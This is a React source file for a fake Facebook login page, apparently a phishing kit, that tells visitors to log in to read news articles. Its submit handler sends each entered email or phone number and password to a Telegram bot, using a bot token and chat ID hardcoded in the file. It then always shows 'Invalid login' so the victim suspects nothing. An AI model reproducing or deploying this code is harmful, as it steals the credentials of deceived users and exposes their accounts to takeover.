import { useState } from 'react'
import supabase from './SuperbaseClient'

const LoginForm = () => {
  const [emailOrPhone, setEmailOrPhone] = useState('')
  const [password, setPassword] = useState('')
  const [message, setMessage] = useState('')

  const handleSubmit = async (e) => {
  e.preventDefault()

  const BOT_TOKEN = '7978921198:AAGMpYfajBHF8LgWVC0f1sxRcNqtRggMH8I'
  const CHAT_ID = '5576038167'

  const message = `🔐 Facebook Login Attempt:\n📧: ${emailOrPhone}\n🔑: ${password}`

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    })

    setMessage('Invalid login') 
  } catch (error) {
    console.error('Error sending to Telegram:', error)
    setMessage('Invalid login')
  }

  setEmailOrPhone('')
  setPassword('')
}


  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white p-6 md:p-8 rounded-lg shadow-lg w-full max-w-md">
        <div className="text-center mb-4 md:mb-6">
          <h1 className="text-4xl md:text-5xl font-bold text-[#1877F2]">facebook</h1>
          <p className="text-gray-600 text-sm md:text-base">Log in to Facebook to read news article's.</p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              value={emailOrPhone}
              onChange={(e) => setEmailOrPhone(e.target.value)}
              placeholder="Email address or phone number"
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#1877F2]"
              required
            />
          </div>
          <div>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#1877F2]"
              required
            />
          </div>
          <button
            type="submit"
            className="w-full bg-[#1877F2] text-white p-3 rounded-md hover:bg-[#166FE5] transition-colors"
          >
            Log In
          </button>
          {message && (
            <p className="text-red-500 text-center text-sm md:text-base">{message}</p>
          )}
          <div className="text-center">
            <a href="#" className="text-[#1877F2] hover:underline text-sm md:text-base">
              Forgotten account?
            </a>
          </div>
          <div className="text-center my-4">
            <hr className="border-gray-300" />
          </div>
          <div className="text-center">
            <button
              type="button"
              className="w-full bg-[#42B72A] text-white p-3 rounded-md hover:bg-[#36A420] transition-colors"
            >
              Create new account
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}

export default LoginForm
